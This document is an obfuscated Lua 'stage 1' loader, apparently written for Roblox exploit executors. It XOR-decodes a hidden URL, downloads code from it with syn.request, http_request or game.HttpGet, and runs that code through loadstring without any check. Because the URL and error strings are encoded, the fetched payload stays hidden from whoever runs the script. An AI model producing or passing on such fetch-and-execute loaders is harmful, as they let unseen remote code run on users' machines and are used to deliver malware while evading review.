-- YLI loader (stage 1)
do local _BX=(bit32 and bit32.bxor)or(function(a,b) local r,m=0,1 while a>0 or b>0 do local x,y=a%2,b%2 if x~=y then r=r+m end a=(a-x)/2 b=(b-y)/2 m=m*2 end return r end) local _HB=(type(buffer)=="table" and type(buffer.create)=="function" and type(buffer.writeu8)=="function" and type(buffer.readstring)=="function") local _SD=function(t) if _HB then local b=buffer.create(#t) for i=1,#t do buffer.writeu8(b,i-1,_BX(t[i],(236+i*7)%256)) end local r=buffer.readstring(b,0,#t) b=nil return r end local o={} for i=1,#t do o[i]=string.char(_BX(t[i],(236+i*7)%256)) end return table.concat(o) end
 local _u=_SD({155,142,117,120,124,44,50,11,82,94,80,109,36,42,59,114,25,15,3,23,82,245,238,230,242,210,221,158,192,209,183,167,182,168,146,198,139,147,139,43,106,98,112,15,81,31,26,80,44,43,53,58,48,2,20,91,66,228,186,251,162,243,206,199,210,192,254,188,242,225,229,213,138,192,201,49,100,61,37,122,26,29,7,0,8,112,41,109,62,85,12,67,18,72,180,187,241,249,196,152,155})
 local _g=(syn and syn.request) or http_request or request
 local _b=nil
 if type(_g)=="function" then local _o,_r=pcall(_g,{Url=_u,Method=_SD({180,191,85})}) if _o and type(_r)=="table" then _b=_r.Body or _r.body end elseif type(game)=="table" and type(game.HttpGet)=="function" then local _o,_v=pcall(game.HttpGet,game,_u) if _o then _b=_v end end
 if type(_b)~="string" or #_b<16 then error(_SD({168,163,77,65,82,54,113,75,74,86,92,50,125,110,48,49,19,30,8,88,12,242,236,243,254,143,155,144,219,219,171,241})..tostring(type(_b)=="string" and #_b or -1),0) end
 local _L=(type(loadstring)=="function" and loadstring) or load
 if type(_L)~="function" then error(_SD({168,163,77,65,82,54,113,75,74,86,92,50,125,110,59,51,67,6,30,25,27,245,249,230,242,204,206}),0) end
 local _f,_e=_L(_b) if type(_f)~="function" then error(_SD({168,163,77,65,82,54,113,75,74,86,92,50,125,110,54,51,14,26,24,20,26,166,235,245,242,206,204,212,141,158})..tostring(_e),0) end
 return _f()
end
